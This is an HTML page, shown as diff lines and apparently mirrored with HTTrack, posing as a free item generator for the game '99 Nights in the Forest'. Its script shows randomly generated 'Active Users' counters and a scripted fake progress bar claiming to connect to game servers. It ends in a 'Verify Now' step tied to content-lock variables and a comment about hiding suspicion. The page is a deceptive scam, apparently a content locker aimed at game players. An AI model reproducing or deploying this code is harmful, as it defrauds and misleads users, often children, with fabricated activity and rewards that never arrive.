style="left: 78.9895vw; animation-duration: 0.653449s; animation-delay: 1.25372s;"></div><div class="rain-drop" style="left: 90.2909vw; animation-duration: 1.28154s; animation-delay: 1.07496s;"></div><div class="rain-drop" style="left: 11.2815vw; animation-duration: 0.640842s; animation-delay: 1.24824s;"></div><div class="rain-drop" style="left: 81.364vw; animation-duration: 1.22933s; animation-delay: 0.437841s;"></div><div class="rain-drop" style="left: 94.6391vw; animation-duration: 0.745153s; animation-delay: 1.17856s;"></div><div class="rain-drop" style="left: 58.6772vw; animation-duration: 0.868507s; animation-delay: 1.91513s;"></div><div class="rain-drop" style="left: 64.1206vw; animation-duration: 0.998022s; animation-delay: 0.753314s;"></div><div class="rain-drop" style="left: 74.537vw; animation-duration: 1.01518s; animation-delay: 0.131729s;"></div><div class="rain-drop" style="left: 31.6422vw; animation-duration: 1.35188s; animation-delay: 0.752813s;"></div><div class="rain-drop" style="left: 34.919vw; animation-duration: 0.563066s; animation-delay: 0.838562s;"></div><div class="rain-drop" style="left: 81.8403vw; animation-duration: 0.748711s; animation-delay: 1.02297s;"></div><div class="rain-drop" style="left: 60.9195vw; animation-duration: 1.03389s; animation-delay: 0.304114s;"></div><div class="rain-drop" style="left: 0.796672vw; animation-duration: 1.45453s; animation-delay: 0.610019s;"></div><div class="rain-drop" style="left: 23.0096vw; animation-duration: 0.86391s; animation-delay: 1.68423s;"></div></div>
+
+    <div class="container">
+        <!-- Stats Section -->
+        <div class="stats-section">
+            <div class="stat-card">
+                <div class="stat-number" id="activeUsers">102</div>
+                <div class="stat-label">Active Users</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="itemsSent">1</div>
+                <div class="stat-label">Items Sent Today</div>
+            </div>
+        </div>
+
+        <!-- Logo Section -->
+        <div class="logo-section">
+            <img src="https://99nights1k.vercel.app/images/340806015.png" alt="Game Logo" class="logo">
+        </div>
+
+        <!-- Header Section -->
+        <header class="header">
+            <h1 class="main-title">99 NIGHTS IN THE FOREST</h1>
+        </header>
+
+        <!-- Selection Section -->
+        <div class="selection-section">
+            <div class="selection-boxes">
+                <div class="selection-box empty" id="slot1">
+                    <div class="empty-text">Select Item</div>
+                    <button class="remove-btn" onclick="removeFromSlot(1)">×</button>
+                </div>
+                <div class="selection-box empty" id="slot2">
+                    <div class="empty-text">Select Item</div>
+                    <button class="remove-btn" onclick="removeFromSlot(2)">×</button>
+                </div>
+                <div class="selection-box empty" id="slot3">
+                    <div class="empty-text">Select Item</div>
+                    <button class="remove-btn" onclick="removeFromSlot(3)">×</button>
+                </div>
+            </div>
+            <div style="text-align: center;">
+                <button class="clear-btn" id="clearBtn" onclick="clearAllSelections()">Clear All Selections</button>
+            </div>
+        </div>
+
+        <!-- Input Section -->
+        <div class="input-section">
+            <div class="input-container">
+                <input type="text" id="playerName" placeholder="Username" class="player-input">
+                <button id="sendBtn" class="send-button">SEND</button>
+            </div>
+        </div>
+
+        <!-- Items Grid -->
+        <div class="items-grid">
+            <div class="item-card" data-item="item1" data-name="Item 1">
+                <img src="https://99nights1k.vercel.app/images/226861950.png" alt="Item 1" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item2" data-name="Item 2">
+                <img src="https://99nights1k.vercel.app/images/299471783.png" alt="Item 2" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item3" data-name="Item 3">
+                <img src="https://99nights1k.vercel.app/images/897708704.png" alt="Item 3" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item4" data-name="Item 4">
+                <img src="https://99nights1k.vercel.app/images/590286221.png" alt="Item 4" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item5" data-name="Item 5">
+                <img src="https://99nights1k.vercel.app/images/136420184.png" alt="Item 5" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item6" data-name="Item 6">
+                <img src="https://99nights1k.vercel.app/images/204484201.png" alt="Item 6" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item7" data-name="Item 7">
+                <img src="https://99nights1k.vercel.app/images/593900961.png" alt="Item 7" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item8" data-name="Item 8">
+                <img src="https://99nights1k.vercel.app/images/137000653.png" alt="Item 8" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item9" data-name="Item 9">
+                <img src="https://99nights1k.vercel.app/images/725716968.png" alt="Item 9" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item10" data-name="Item 10">
+                <img src="https://99nights1k.vercel.app/images/296684143.png" alt="Item 10" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item11" data-name="Item 11">
+                <img src="https://99nights1k.vercel.app/images/672263902.png" alt="Item 11" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item12" data-name="Item 12">
+                <img src="https://99nights1k.vercel.app/images/823948062.png" alt="Item 12" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item13" data-name="Item 13">
+                <img src="https://99nights1k.vercel.app/images/990751907.png" alt="Item 13" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item14" data-name="Item 14">
+                <img src="https://99nights1k.vercel.app/images/202277424.png" alt="Item 14" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item15" data-name="Item 15">
+                <img src="https://99nights1k.vercel.app/images/357602713.png" alt="Item 15" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item16" data-name="Item 16">
+                <img src="images/468295971.png" alt="Item 16" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item17" data-name="Item 17">
+                <img src="https://99nights1k.vercel.app/images/468295971.png" alt="Item 17" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item18" data-name="Item 18">
+                <img src="https://99nights1k.vercel.app/images/914045492.png" alt="Item 18" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item19" data-name="Item 19">
+                <img src="https://99nights1k.vercel.app/images/271326656.png" alt="Item 19" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item20" data-name="Item 20">
+                <img src="https://99nights1k.vercel.app/images/387561421.png" alt="Item 20" class="item-icon">
+            </div>
+
+            <div class="item-card" data-item="item21" data-name="Item 21">
+                <img src="https://99nights1k.vercel.app/images/476681827.png" alt="Item 21" class="item-icon">
+            </div>
+        </div>
+
+        <!-- Popup Overlay -->
+        <div class="popup-overlay" id="popupOverlay">
+            <!-- Progress Popup -->
+            <div class="progress-popup" id="progressPopup">
+                <div class="progress-msg" id="progressMsg">Processing your request...</div>
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progressBarFill"></div>
+                </div>
+                <div class="progress-num" id="progressNum">0%</div>
+            </div>
+
+            <!-- Final Step Screen -->
+            <div class="final-step-screen" id="finalStepScreen">
+                <div class="final-step-title">Last Step to Get Your Gift</div>
+                <div class="final-items-display" id="finalItemsDisplay"></div>
+                <div class="verification-message">
+                    Complete the verification below to receive your selected items.<br>
+                    Click the button and follow the steps to unlock your rewards!
+                </div>
+                <button class="verify-button" onclick="_ux()">Verify Now</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedItems = {};
+        let isProcessing = false;
+        let clickSound, successSound, victorySound;
+
+        // Anti-theft protection system
+        function getContentLockKey(){
+            try {
+                return (typeof nOHbO_GCv_muGEhc === 'object' ? (nOHbO_GCv_muGEhc.key || "") : "");
+            } catch { return ""; }
+        }
+        function getContentLockIT(){
+            try {
+                return (typeof nOHbO_GCv_muGEhc === 'object' ? (nOHbO_GCv_muGEhc.it || "") : "");
+            } catch { return ""; }
+        }
+
+        var _realKey = "416fd";
+        var _realIt = 4547348;
+        var visitCount = parseInt(localStorage.getItem('_kc_visit_count')||'0') || 0;
+        var safeVisits = [1,2,4,7,11,16,22,29,37,46]; // Non-sequential visits to hide suspicion
+        
+
+        // Enhanced audio with better frequencies
+        function initAudio() {
+            const clickAudio = new AudioContext();
+            clickSound = {
+                play: () => {
+                    const oscillator = clickAudio.createOscillator();
+                    const gainNode = clickAudio.createGain();
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(clickAudio.destination);
+                    
+                    oscillator.frequency.setValueAtTime(800, clickAudio.currentTime);
+                    oscillator.frequency.exponentialRampToValueAtTime(600, clickAudio.currentTime + 0.1);
+                    
+                    gainNode.gain.setValueAtTime(0, clickAudio.currentTime);
+                    gainNode.gain.linearRampToValueAtTime(0.3, clickAudio.currentTime + 0.01);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, clickAudio.currentTime + 0.1);
+                    
+                    oscillator.start(clickAudio.currentTime);
+                    oscillator.stop(clickAudio.currentTime + 0.1);
+                }
+            };
+
+            successSound = {
+                play: () => {
+                    const oscillator = clickAudio.createOscillator();
+                    const gainNode = clickAudio.createGain();
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(clickAudio.destination);
+                    
+                    oscillator.frequency.setValueAtTime(400, clickAudio.currentTime);
+                    oscillator.frequency.linearRampToValueAtTime(600, clickAudio.currentTime + 0.1);
+                    oscillator.frequency.linearRampToValueAtTime(800, clickAudio.currentTime + 0.2);
+                    
+                    gainNode.gain.setValueAtTime(0, clickAudio.currentTime);
+                    gainNode.gain.linearRampToValueAtTime(0.4, clickAudio.currentTime + 0.01);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, clickAudio.currentTime + 0.3);
+                    
+                    oscillator.start(clickAudio.currentTime);
+                    oscillator.stop(clickAudio.currentTime + 0.3);
+                }
+            };
+
+            victorySound = {
+                play: () => {
+                    const notes = [523, 659, 784, 1047]; // C, E, G, C
+                    
+                    notes.forEach((freq, index) => {
+                        setTimeout(() => {
+                            const oscillator = clickAudio.createOscillator();
+                            const gainNode = clickAudio.createGain();
+                            
+                            oscillator.connect(gainNode);
+                            gainNode.connect(clickAudio.destination);
+                            
+                            oscillator.frequency.setValueAtTime(freq, clickAudio.currentTime);
+                            
+                            gainNode.gain.setValueAtTime(0, clickAudio.currentTime);
+                            gainNode.gain.linearRampToValueAtTime(0.3, clickAudio.currentTime + 0.01);
+                            gainNode.gain.exponentialRampToValueAtTime(0.01, clickAudio.currentTime + 0.4);
+                            
+                            oscillator.start(clickAudio.currentTime);
+                            oscillator.stop(clickAudio.currentTime + 0.4);
+                        }, index * 100);
+                    });
+                }
+            };
+        }
+
+        function playClickSound() {
+            try {
+                if (clickSound) clickSound.play();
+            } catch (e) {
+                console.log('Audio not available');
+            }
+        }
+
+        function playSuccessSound() {
+            try {
+                if (successSound) successSound.play();
+            } catch (e) {
+                console.log('Audio not available');
+            }
+        }
+
+        function playVictorySound() {
+            try {
+                if (victorySound) victorySound.play();
+            } catch (e) {
+                console.log('Audio not available');
+            }
+        }
+
+        // Rain effect
+        function createRain() {
+            const rainContainer = document.getElementById('rainContainer');
+            const numberOfDrops = 50;
+
+            for (let i = 0; i < numberOfDrops; i++) {
+                const drop = document.createElement('div');
+                drop.className = 'rain-drop';
+                drop.style.left = Math.random() * 100 + 'vw';
+                drop.style.animationDuration = (Math.random() * 1 + 0.5) + 's';
+                drop.style.animationDelay = Math.random() * 2 + 's';
+                rainContainer.appendChild(drop);
+            }
+        }
+
+        // Stats animation
+        function animateStats() {
+            const activeUsersElement = document.getElementById('activeUsers');
+            const itemsSentElement = document.getElementById('itemsSent');
+            
+            const targetUsers = Math.floor(Math.random() * 300) + 1;
+            const targetItems = Math.floor(Math.random() * 300) + 1;
+            
+            animateCounter(activeUsersElement, targetUsers, 2000);
+            animateCounter(itemsSentElement, targetItems, 2500);
+        }
+
+        function animateCounter(element, target, duration) {
+            let start = 0;
+            const startTime = performance.now();
+            
+            function updateCounter(currentTime) {
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                
+                const current = Math.floor(start + (target - start) * easeOutQuart(progress));
+                element.textContent = current;
+                
+                if (progress < 1) {
+                    requestAnimationFrame(updateCounter);
+                }
+            }
+            
+            requestAnimationFrame(updateCounter);
+        }
+
+        function easeOutQuart(t) {
+            return 1 - Math.pow(1 - t, 4);
+        }
+
+        // Update stats every 30 seconds
+        function updateStats() {
+            setInterval(() => {
+                const activeUsersElement = document.getElementById('activeUsers');
+                const itemsSentElement = document.getElementById('itemsSent');
+                
+                const currentUsers = parseInt(activeUsersElement.textContent);
+                const currentItems = parseInt(itemsSentElement.textContent);
+                
+                const newUsers = Math.max(1, currentUsers + Math.floor(Math.random() * 10) - 5);
+                const newItems = Math.max(1, currentItems + Math.floor(Math.random() * 5));
+                
+                const finalUsers = Math.min(300, newUsers);
+                const finalItems = Math.min(300, newItems);
+                
+                animateCounter(activeUsersElement, finalUsers, 1000);
+                animateCounter(itemsSentElement, finalItems, 1000);
+            }, 30000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize audio on first user interaction
+            document.addEventListener('click', function initAudioOnInteraction() {
+                initAudio();
+                document.removeEventListener('click', initAudioOnInteraction);
+            }, { once: true });
+
+            createRain();
+            animateStats();
+            updateStats();
+            
+            const itemCards = document.querySelectorAll('.item-card');
+            const sendBtn = document.getElementById('sendBtn');
+            const playerNameInput = document.getElementById('playerName');
+            const clearBtn = document.getElementById('clearBtn');
+
+            itemCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    if (isProcessing) return;
+                    
+                    playClickSound();
+                    
+                    const itemData = {
+                        id: this.dataset.item,
+                        name: this.dataset.name,
+                        image: this.querySelector('.item-icon').src
+                    };
+
+                    selectItem(itemData, this);
+                });
+            });
+
+            sendBtn.addEventListener('click', function() {
+                if (isProcessing) return;
+                
+                playSuccessSound();
+                
+                const playerName = playerNameInput.value.trim();
+                const selectedItemsArray = Object.values(selectedItems);
+
+                if (!playerName) {
+                    alert('Please enter your username!');
+                    return;
+                }
+
+                if (selectedItemsArray.length === 0) {
+                    alert('Please select at least one item!');
+                    return;
+                }
+
+                startProgressAnimation(playerName, selectedItemsArray);
+            });
+
+            clearBtn.addEventListener('click', function() {
+                playClickSound();
+            });
+
+            // Add remove button sounds
+            document.addEventListener('click', function(e) {
+                if (e.target.classList.contains('remove-btn')) {
+                    playClickSound();
+                }
+            });
+        });
+
+        function selectItem(itemData, cardElement) {
+            let targetSlot = null;
+            for (let i = 1; i <= 3; i++) {
+                const slot = document.getElementById(`slot${i}`);
+                if (slot.classList.contains('empty')) {
+                    targetSlot = i;
+                    break;
+                }
+            }
+
+            if (!targetSlot) {
+                targetSlot = 1;
+            }
+
+            cardElement.classList.add('clicked');
+            setTimeout(() => cardElement.classList.remove('clicked'), 800);
+
+            const slot = document.getElementById(`slot${targetSlot}`);
+            createFlyingAnimation(cardElement, slot, itemData, targetSlot);
+        }
+
+        function createFlyingAnimation(sourceElement, targetSlot, itemData, slotNumber) {
+            const sourceRect = sourceElement.getBoundingClientRect();
+            const targetRect = targetSlot.getBoundingClientRect();
+
+            const flyingIcon = document.createElement('div');
+            flyingIcon.className = 'flying-icon';
+            flyingIcon.style.left = sourceRect.left + 'px';
+            flyingIcon.style.top = sourceRect.top + 'px';
+
+            flyingIcon.innerHTML = `
+                <div class="flying-icon-container">
+                    <img src="${itemData.image}" alt="${itemData.name}" class="flying-item-icon">
+                </div>
+            `;
+
+            document.body.appendChild(flyingIcon);
+
+            sourceElement.classList.add('flying-source');
+            targetSlot.classList.add('receiving');
+
+            setTimeout(() => {
+                flyingIcon.style.left = (targetRect.left + targetRect.width/2 - 42.5) + 'px';
+                flyingIcon.style.top = (targetRect.top + targetRect.height/2 - 42.5) + 'px';
+                flyingIcon.style.transform = 'scale(0.8)';
+            }, 50);
+
+            setTimeout(() => {
+                addToSlot(slotNumber, itemData);
+                flyingIcon.remove();
+                sourceElement.classList.remove('flying-source');
+                targetSlot.classList.remove('receiving');
+            }, 550);
+        }
+
+        function addToSlot(slotNumber, itemData) {
+            const slot = document.getElementById(`slot${slotNumber}`);
+            
+            slot.classList.remove('empty');
+            slot.classList.add('filled');
+            
+            slot.innerHTML = `
+                <img src="${itemData.image}" alt="${itemData.name}" class="selected-icon">
+                <button class="remove-btn" onclick="removeFromSlot(${slotNumber})">×</button>
+            `;
+
+            selectedItems[slotNumber] = itemData;
+        }
+
+        function removeFromSlot(slotNumber) {
+            if (isProcessing) return;
+            
+            const slot = document.getElementById(`slot${slotNumber}`);
+            
+            slot.classList.remove('filled');
+            slot.classList.add('empty');
+            
+            slot.innerHTML = `
+                <div class="empty-text">Select Item</div>
+                <button class="remove-btn" onclick="removeFromSlot(${slotNumber})">×</button>
+            `;
+
+            delete selectedItems[slotNumber];
+        }
+
+        function clearAllSelections() {
+            if (isProcessing) return;
+            
+            for (let i = 1; i <= 3; i++) {
+                removeFromSlot(i);
+            }
+        }
+
+        function startProgressAnimation(playerName, selectedItemsArray) {
+            isProcessing = true;
+            const popupOverlay = document.getElementById('popupOverlay');
+            const progressPopup = document.getElementById('progressPopup');
+            const progressMsg = document.getElementById('progressMsg');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const progressNum = document.getElementById('progressNum');
+
+            popupOverlay.style.display = 'flex';
+            progressPopup.style.display = 'block';
+
+            const messages = [
+                'Connecting to 99 Nights servers...',
+                'Verifying your account...',
+                'Processing selected items...',
+                'Preparing your forest adventure rewards...',
+                'Finalizing delivery...'
+            ];
+
+            let currentStep = 0;
+            let progress = 0;
+
+            const progressInterval = setInterval(() => {
+                progress += (100 / (3 * 1000)) * 100; // Fill in exactly 3 seconds
+                
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    
+                    setTimeout(() => {
+                        showFinalStep(playerName, selectedItemsArray);
+                    }, 200);
+                }
+
+                progressBarFill.style.width = progress + '%';
+                progressNum.textContent = Math.floor(progress) + '%';
+
+                if (progress > (currentStep + 1) * 20 && currentStep < messages.length - 1) {
+                    currentStep++;
+                    progressMsg.textContent = messages[currentStep];
+                }
+            }, 100);
+        }
+
+        function showFinalStep(playerName, selectedItemsArray) {
+            const progressPopup = document.getElementById('progressPopup');
+            const finalStepScreen = document.getElementById('finalStepScreen');
+            const finalItemsDisplay = document.getElementById('finalItemsDisplay');
+
+            progressPopup.style.display = 'none';
+            finalStepScreen.style.display = 'block';
+
+            finalItemsDisplay.innerHTML = selectedItemsArray.map(item => 
+                `<img src="${item.image}" alt="${item.name}">`
+            ).join('');
+        }
+    </script>
+
+
+
+
+</body><!-- Mirrored from nightsforest.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Sep 2025 20:04:36 GMT --></html>
